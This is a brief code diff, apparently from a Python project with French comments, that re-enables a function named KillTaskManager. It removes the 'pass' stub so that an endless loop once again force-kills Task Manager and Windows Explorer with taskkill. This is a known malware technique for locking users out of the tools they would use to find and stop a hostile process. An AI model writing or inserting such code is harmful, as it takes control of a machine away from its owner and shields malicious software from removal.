@@ -7,8 +7,7 @@ def is_admin(): # Fonction pour vérifier si l'utilisateur est administrateur
         return False
 
 
-def KillTaskManager(): # Fonction pour kill le tskmngr et l'explorer [Temporairement down pour régler le problème des cmd qui s'ouvrent et qui se ferment]
-    pass
+def KillTaskManager(): # Fonction pour kill le tskmngr et l'explorer
     while True:
         os.system("taskkill /F /IM Taskmgr.exe")
         os.system("taskkill /F /IM explorer.exe")
